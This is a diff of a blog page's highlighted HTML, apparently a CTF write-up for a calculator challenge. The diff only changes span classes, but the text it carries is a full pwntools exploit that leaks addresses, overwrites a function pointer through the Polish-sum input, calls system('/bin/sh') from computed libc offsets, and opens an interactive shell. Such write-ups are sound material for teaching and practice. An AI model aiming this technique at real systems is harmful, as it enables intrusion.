@@ -410,34 +410,34 @@ Calculators are fun!
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">take_note</span><span class="p">(</span><span class="n">note</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"note: "</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"note: "</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">read_note</span><span class="p">():</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operator:"</span><span class="p">,</span> <span class="s">"S"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operator:"</span><span class="p">,</span> <span class="s">"S"</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">:</span>
         <span class="k">print</span> <span class="s">"adding:"</span><span class="p">,</span> <span class="n">num</span>
-        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -448,21 +448,21 @@ Calculators are fun!
     <span class="n">take_note</span><span class="p">(</span><span class="s">"123"</span><span class="p">)</span>
     <span class="n">read_note</span><span class="p">()</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"note: "</span><span class="p">)</span>
-    <span class="n">fptr_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x350</span> <span class="c1"># where the function pointer be loaded
-</span>    <span class="n">text_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x6fb</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"note: "</span><span class="p">)</span>
+    <span class="n">fptr_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x350</span> <span class="c1"># where the function pointer be loaded
+</span>    <span class="n">text_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x6fb</span>
     <span class="n">puts</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x520</span>
     <span class="n">lsm_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x2fe0</span>
     <span class="n">puts_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x2fd8</span>
     
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"fptr_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">fptr_addr</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"fptr_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">fptr_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
 
     <span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mh">0x63</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="n">puts</span><span class="p">,</span> <span class="n">lsm_got</span><span class="p">]</span>
     <span class="n">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
 
     <span class="n">sign</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># this will call puts(lsm_got)
-</span>    <span class="n">lsm_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+</span>    <span class="n">lsm_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
     <span class="c1">#########################################
 </span>    <span class="c1">#$ ./dump libc6-i386_2.24-3ubuntu2_amd64
 </span>    <span class="c1">#offset___libc_start_main = 0x00018180
@@ -472,15 +472,15 @@ Calculators are fun!
 </span>    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">lsm_addr</span> <span class="o">+</span> <span class="mh">0x22730</span> 
     <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">lsm_addr</span> <span class="o">+</span> <span class="mh">0x144a4f</span> 
 	
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"lsm: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lsm_addr</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"lsm: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lsm_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
 
-    <span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mh">0x63</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)]</span>
+    <span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mh">0x63</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span> <span class="n">numpy</span><span class="p">.</span><span class="n">int32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)]</span>
     <span class="n">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
     <span class="n">sign</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># this time will call system("/bin/sh")
 </span>    
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>The flag is in <code class="language-plaintext highlighter-rouge">/challenge/flag.txt</code></p>
